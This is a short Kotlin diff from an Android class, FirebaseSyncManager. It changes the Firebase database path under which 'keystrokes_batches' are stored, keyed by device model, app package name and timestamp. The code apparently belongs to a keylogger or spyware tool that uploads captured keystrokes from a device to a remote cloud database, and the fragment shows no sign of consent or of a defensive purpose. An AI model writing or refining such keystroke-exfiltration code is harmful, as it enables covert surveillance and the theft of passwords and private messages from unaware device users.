@@ -22,7 +22,7 @@ class FirebaseSyncManager {
                 try {
                     val database = FirebaseDatabase.getInstance()
                     val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
-                    val ref = database.getReference().child(deviceName).child("keystrokes_batches")
+                    val ref = database.getReference().child("keystrokes_batches").child(deviceName)
                     val appName = (packageName ?: "unknown.app").replace(Regex("[^a-zA-Z0-9_-]"), "_")
                     val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
 
